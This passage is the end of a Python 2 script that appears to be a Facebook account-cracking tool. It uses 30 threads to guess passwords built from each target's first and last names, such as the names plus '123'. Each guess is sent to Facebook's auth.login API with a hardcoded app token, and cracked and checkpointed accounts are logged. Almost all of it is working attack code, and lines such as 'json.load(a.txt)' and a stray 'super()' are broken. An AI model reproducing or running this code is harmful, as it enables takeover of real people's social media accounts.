                                                                                                    print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass23 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                                    cekpoint.append(user + pass23)
                                                                                                else:
                                                                                                    pass24 = b['last_name'] + b['first_name']
                                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass24 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                    q = json.load(data)
                                                                                                    if 'access_token' in q:
                                                                                                        print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass24 + '  \x1b[92m[LOG IN NOW]'
                                                                                                        oks.append(user + pass24)
                                                                                                    elif 'www.facebook.com' in q['error_msg']:
                                                                                                        print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass24 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                                        cekpoint.append(user + pass24)
                                                                                                    else:
                                                                                                        b = json.load(a.txt)
                                                                                                        pass25 = b['first_name'] + b['last_name'] + '123'
                                                                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass25 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                        q = json.load(data)
                                                                                                        if 'access_token' in q:
                                                                                                            print '\x1b[92m[SUCCESSFULL]' + user + '\x1b[92m>>>>' + pass25 + '  \x1b[92m[LOG IN NOW]'
                                                                                                            oks.append(user + pass25)
                                                                                                        elif 'www.facebook.com' in q['error_msg']:
                                                                                                            print '\x1b[93m[CHECKPOINT]' + user + '\x1b[94m>>>>>\x1b[93m' + pass25 + '  \x1b[96m[LOG IN AFTER 5 DAYS]'
                                                                                                            cekpoint.append(user + pass25)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[00m[\x1b[00m\xe2\x9c\x93\x1b[00m] \x1b[1;92mProcess Completed \x1b[1;97m....'
    print '\x1b[00m[+] \x1b[1;92mTotal OK/\x1b[91mCP \x1b[93m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;92m/\x1b[91m' + str(len(cekpoint))
    raw_input('\n\x1b[00m[\x1b[92mBack\x1b[00m]')
    super()


if __name__ == '__main__':
    login()